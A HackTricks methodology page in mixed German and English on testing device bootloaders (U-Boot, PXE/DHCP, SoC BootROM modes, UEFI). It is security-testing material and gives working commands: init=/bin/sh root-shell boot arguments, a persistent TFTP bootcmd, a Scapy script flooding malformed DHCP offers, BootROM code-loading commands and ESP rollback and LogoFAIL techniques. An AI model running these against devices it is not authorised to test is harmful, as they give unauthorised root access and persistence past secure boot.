# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Startkonfigurationen von Geräten zu ändern und Bootloader wie U-Boot und UEFI‑Klassenloader zu testen. Konzentriere dich darauf, frühen Codeausführung zu erreichen, Signatur-/Rollback-Schutz zu bewerten und Recovery- oder Netzwerk-Boot-Pfade auszunutzen.

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Während des Bootvorgangs eine bekannte Unterbrechungstaste drücken (oft jede Taste, 0, Space oder eine platten-spezifische "magic" Sequenz), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.

2. Inspect boot state and variables
- Nützliche Befehle:
- `printenv` (Umgebung ausgeben)
- `bdinfo` (Board-Info, Speicheradressen)
- `help bootm; help booti; help bootz` (unterstützte Kernel-Boot-Methoden)
- `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Modify boot arguments to get a root shell
- Füge `init=/bin/sh` an, damit der Kernel anstelle des normalen inits eine Shell startet:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # oder: run bootcmd
```

4. Netboot from your TFTP server
- Netzwerk konfigurieren und einen Kernel/FIT-Image aus dem LAN holen:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Wenn der Env-Speicher nicht write-protected ist, kannst du Kontrolle persistent machen:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Breaks in die Shell erlauben.

6. Check debug/unsafe features
- Achte auf: `bootdelay` > 0, `autoboot` deaktiviert, uneingeschränkte `usb start; fatload usb 0:1 ...`, Fähigkeit zu `loady`/`loads` über Serial, `env import` von untrusted media, und Kernel/Ramdisks, die ohne Signaturüberprüfung geladen werden.

7. U-Boot image/verification testing
- Wenn die Plattform sicheren/verifizierten Boot mit FIT-Images behauptet, teste sowohl unsigned als auch manipulierte Images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder legacy `verify=n` Verhalten erlaubt häufig das Booten beliebiger Payloads.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boots legacy BOOTP/DHCP-Handling hatte Sicherheitsprobleme auf Memory-Ebene. Beispielsweise beschreibt CVE‑2024‑42040 eine Memory-Disclosure via manipulierte DHCP-Antworten, die Bytes aus U-Boot-Speicher zurück on the wire leak können. Teste die DHCP/PXE-Codepfade mit überlangen/Edge-Case-Werten (option 67 bootfile-name, vendor options, file/servername-Felder) und beobachte Hänger/leaks.
- Minimaler Scapy-Snippet, um Boot-Parameter während Netboot zu stressen:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Prüfe auch, ob PXE-Dateinamen-Felder an Shell-/Loader-Logik weitergereicht werden, ohne Sanitization, wenn sie an OS-seitige Provisioning-Skripte durchgereicht werden.

9. Rogue DHCP server command injection testing
- Setze einen Rogue DHCP/PXE-Service auf und versuche, Zeichen in Filename- oder Options-Felder zu injizieren, um spätere Stufen der Bootkette zu erreichen, die Kommandointerpreter verwenden. Metasploit’s DHCP auxiliary, `dnsmasq` oder custom Scapy-Skripte eignen sich gut. Isoliere zuerst das Labornetz.

## SoC ROM recovery modes that override normal boot

Viele SoCs bieten einen BootROM-"loader"-Modus, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn secure-boot-Fuses nicht gebrannt sind, kann dies sehr früh in der Kette arbitrary code execution ermöglichen.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
- Beispiel: `imx-usb-loader u-boot.imx` um einen custom U-Boot in RAM zu pushen und auszuführen.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` um einen Loader zu stage-en und einen custom U-Boot hochzuladen.

Bewerte, ob das Gerät secure-boot eFuses/OTP gebrannt hat. Falls nicht, umgehen BootROM-Download-Modi häufig jegliche höherstufige Verifikation (U-Boot, Kernel, rootfs), indem dein First-Stage-Payload direkt aus SRAM/DRAM ausgeführt wird.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount die EFI System Partition (ESP) und prüfe auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo Pfade.
- Versuche mit downgraded oder bekannten vulnerable signed Boot-Komponenten zu booten, falls Secure Boot Revocations (dbx) nicht aktuell sind. Wenn die Plattform noch alte shims/bootmanagers vertraut, kannst du oft deinen eigenen Kernel oder `grub.cfg` von der ESP laden, um Persistenz zu erreichen.

11. Boot logo parsing bugs (LogoFAIL class)
- Mehrere OEM/IBV-Firmwares waren verwundbar gegenüber Image-Parsing-Fehlern in DXE, die Boot-Logos verarbeiten. Wenn ein Angreifer ein crafted Image auf der ESP unter einem vendor-spezifischen Pfad (z.B. `\EFI\<vendor>\logo\*.bmp`) ablegen kann und einen Reboot auslöst, kann Codeausführung während des frühen Bootvorgangs möglich sein, selbst wenn Secure Boot aktiv ist. Teste, ob die Plattform user-supplied Logos akzeptiert und ob diese Pfade vom OS beschrieben werden können.

## Hardware caution

Sei vorsichtig beim Umgang mit SPI/NAND-Flash während des frühen Boots (z.B. Pins kurzschließen, um Reads zu umgehen) und konsultiere immer das Flash-Datenblatt. Fehlgetimte Shorts können das Gerät oder den Programmer beschädigen.

## Notes and additional tips

- Versuche `env export -t ${loadaddr}` und `env import -t ${loadaddr}`, um Environment-Blobs zwischen RAM und Storage zu verschieben; einige Plattformen erlauben das Importieren von env von removable media ohne Authentifizierung.
- Für Persistenz auf Linux-basierten Systemen, die via `extlinux.conf` booten, reicht oft das Ändern der `APPEND`-Zeile (um `init=/bin/sh` oder `rd.break` zu injizieren) auf der Boot-Partition, wenn keine Signaturprüfungen erzwungen werden.
- Falls userland `fw_printenv/fw_setenv` bereitstellt, verifiziere, dass `/etc/fw_env.config` mit dem realen Env-Speicher übereinstimmt. Fehlkonfigurierte Offsets erlauben das Lesen/Schreiben einer falschen MTD-Region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
